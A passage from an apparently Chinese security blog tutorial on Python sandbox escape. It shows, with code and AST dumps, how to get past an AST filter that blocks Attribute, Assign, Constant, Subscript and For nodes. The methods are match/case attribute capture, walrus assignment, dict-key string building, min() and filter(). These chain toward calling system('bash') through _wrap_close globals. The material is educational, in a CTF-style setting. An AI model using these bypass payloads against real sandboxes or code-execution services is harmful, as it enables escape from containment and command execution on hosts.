class="subst">&#123;x = &#125;</span>!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Got x = 32!</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，注意<code>case AClass(thing=x)</code>，这里的含义并非是将 x 赋值给 thing，<strong>我们需要将其理解为一个表达式，表示匹配类型为 AClass 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。</strong></p>
<p>这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 <code>&#39;&#39;.__class__</code>，可以编写如下的 match&#x2F;case 语句：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">str</span>(__class__=x):</span><br><span class="line">        <span class="built_in">print</span>(x==<span class="string">&#x27;&#x27;</span>.__class__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<p>可以看到 x 就是 <code>&#39;&#39;.__class__</code>. 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(__class__=x):</span><br><span class="line">        <span class="built_in">print</span>(x==<span class="string">&#x27;&#x27;</span>.__class__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<p>再测试一下该 payload 的 AST：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ast </span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">match str():</span></span><br><span class="line"><span class="string">    case str(__class__=x):</span></span><br><span class="line"><span class="string">        print(x)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(ast.dump(ast.parse(a, mode=<span class="string">&#x27;exec&#x27;</span>), indent=<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>AST 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Module(</span><br><span class="line">    body=[</span><br><span class="line">        Match(</span><br><span class="line">            subject=Call(</span><br><span class="line">                func=Name(<span class="built_in">id</span>=<span class="string">&#x27;str&#x27;</span>, ctx=Load()),</span><br><span class="line">                args=[],</span><br><span class="line">                keywords=[]),</span><br><span class="line">            cases=[</span><br><span class="line">                match_case(</span><br><span class="line">                    pattern=MatchClass(</span><br><span class="line">                        cls=Name(<span class="built_in">id</span>=<span class="string">&#x27;str&#x27;</span>, ctx=Load()),</span><br><span class="line">                        patterns=[],</span><br><span class="line">                        kwd_attrs=[</span><br><span class="line">                            <span class="string">&#x27;__class__&#x27;</span>],</span><br><span class="line">                        kwd_patterns=[</span><br><span class="line">                            MatchAs(name=<span class="string">&#x27;x&#x27;</span>)]),</span><br><span class="line">                    body=[</span><br><span class="line">                        Expr(</span><br><span class="line">                            value=Call(</span><br><span class="line">                                func=Name(<span class="built_in">id</span>=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                args=[</span><br><span class="line">                                    Name(<span class="built_in">id</span>=<span class="string">&#x27;x&#x27;</span>, ctx=Load())],</span><br><span class="line">                                keywords=[]))])])],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure>

<p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p>
<p>我们可以构造替代 <code>&#39;&#39;.__class__.__base__.__subclasses__()</code>的 payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(__class__=clazz):</span><br><span class="line">        <span class="keyword">match</span> clazz:</span><br><span class="line">            <span class="keyword">case</span> <span class="built_in">object</span>(__base__=bass):</span><br><span class="line">                <span class="keyword">match</span> bass:</span><br><span class="line">                    <span class="keyword">case</span> <span class="built_in">object</span>(__subclasses__=subclazz):</span><br><span class="line">                        <span class="built_in">print</span>(subclazz)</span><br></pre></td></tr></table></figure>

<h5 id="绕过-ast-Assign-赋值变量"><a href="#绕过-ast-Assign-赋值变量" class="headerlink" title="绕过 ast.Assign 赋值变量"></a>绕过 ast.Assign 赋值变量</h5><p>ast.Assign 无法使用时，我们无法直接使用 &#x3D; 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[system:=<span class="number">111</span>,bash:=<span class="number">222</span>]</span><br><span class="line">:=  --》海象运算法，赋值</span><br></pre></td></tr></table></figure>

<p>此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Module(</span><br><span class="line">    body=[</span><br><span class="line">        Expr(</span><br><span class="line">            value=<span class="type">List</span>(</span><br><span class="line">                elts=[</span><br><span class="line">                    NamedExpr(</span><br><span class="line">                        target=Name(<span class="built_in">id</span>=<span class="string">&#x27;system&#x27;</span>, ctx=Store()),</span><br><span class="line">                        value=Constant(value=<span class="number">111</span>)),</span><br><span class="line">                    NamedExpr(</span><br><span class="line">                        target=Name(<span class="built_in">id</span>=<span class="string">&#x27;bash&#x27;</span>, ctx=Store()),</span><br><span class="line">                        value=Constant(value=<span class="number">222</span>))],</span><br><span class="line">                ctx=Load()))],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure>

<h5 id="绕过-ast-Constant-获取数字、字符串"><a href="#绕过-ast-Constant-获取数字、字符串" class="headerlink" title="绕过 ast.Constant 获取数字、字符串"></a>绕过 ast.Constant 获取数字、字符串</h5><p>题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。 例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span> : <span class="built_in">str</span>()</span><br><span class="line"><span class="number">0</span>  : <span class="built_in">len</span>([])</span><br><span class="line"><span class="string">&quot;0&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([]))</span><br><span class="line"><span class="string">&quot;1&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">str</span>()])) 或 <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">min</span>]))</span><br><span class="line"><span class="string">&quot;2&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">str</span>(),<span class="built_in">str</span>()])) 或 <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">max</span>]))</span><br><span class="line"><span class="string">&#x27;A&#x27;</span>: <span class="built_in">chr</span>(<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>])*<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>]))</span><br></pre></td></tr></table></figure>

<p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。</p>
<p>当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串,上面过滤引号那里有说。</p>
<p>在这个 payload 中，需要构造出 _wrap_close、system、bash</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;bash&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>那么就可以通过下面的方式获取到这几个字符串：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(system=[]))[<span class="number">0</span>]            <span class="comment"># system</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[]))[<span class="number">0</span>]       <span class="comment"># _wrap_close</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(bash=[]))[<span class="number">0</span>]              <span class="comment"># bash</span></span><br></pre></td></tr></table></figure>

<h5 id="绕过-ast-Subscript-获取列表-字典元素"><a href="#绕过-ast-Subscript-获取列表-字典元素" class="headerlink" title="绕过 ast.Subscript 获取列表&#x2F;字典元素"></a>绕过 ast.Subscript 获取列表&#x2F;字典元素</h5><p>题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(system=[])))            <span class="comment"># system</span></span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[])))       <span class="comment"># _wrap_close</span></span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(bash=[])))              <span class="comment"># bash</span></span><br></pre></td></tr></table></figure>

<p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match&#x2F;case 来获取。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">globals</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(get=get_func):</span><br><span class="line">        get_func(<span class="string">&quot;system&quot;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="绕过-ast-For-遍历列表"><a href="#绕过-ast-For-遍历列表" class="headerlink" title="绕过 ast.For 遍历列表"></a>绕过 ast.For 遍历列表</h5><p>在构造最终 payload 中，我们还需要在 <code>__subclasses__()</code>得到的列表中获取到 _wrap_close 类。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;bash&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter_func</span>(<span class="params">subclazzes_item</span>):</span><br><span class="line">    [ _wrap_close:=<span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[])))]</span><br><span class="line">    <span class="keyword">match</span> subclazzes_item:</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">object</span>(_＿name_＿=name):</span><br><span class="line">            <span class="keyword">if</span> name==_wrap_close:</span><br><span class="line">                <span class="keyword">return</span> subclazzes_item</span><br><span class="line">[</span><br><span class="line">    subclazzes_item:=<span class="built_in">min</span>(<span class="built_in">filter</span>(filter_func,subclazzes()))</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>fitler 中使用 match&#x2F;case 和 if 来进行过滤。</p>
<p>除了使用 filter 函数外，还可以使用 iter 和 next 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p>
<p>参考文章：<br><code>https://dummykitty.github.io/python/2023/05/29/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86.html</code></p>
<p><code>https://xz.aliyun.com/t/52?time__1311=n4RxyDn7DQ0QUx0y34%2B2Wx9D0Ok%2FdDRmrYD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-5</code></p>
<p><code>https://xz.aliyun.com/t/2308?time__1311=n4%2BxnieDqWqYq7KYBKDsf3Of1GCAD9D4GqxAD&amp;alichlgref=https%3A%2F%2Fucasers.cn%2F</code></p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Fupanc
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://fupanc.github.io/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="python沙箱逃逸">https://fupanc.github.io/2024/06/02/python沙箱逃逸/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/" rel="prev" title="filter过滤器利用总结">
                  <i class="fa fa-angle-left"></i> filter过滤器利用总结
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/" rel="next" title="沙箱逃逸做题总结">
                  沙箱逃逸做题总结 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Fupanc</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">
    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
  </div>

    </div>
  </footer>

  
  <script type="text/javascript"
  color="0,0,0" opacity='0.4' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
    

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/yourname" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
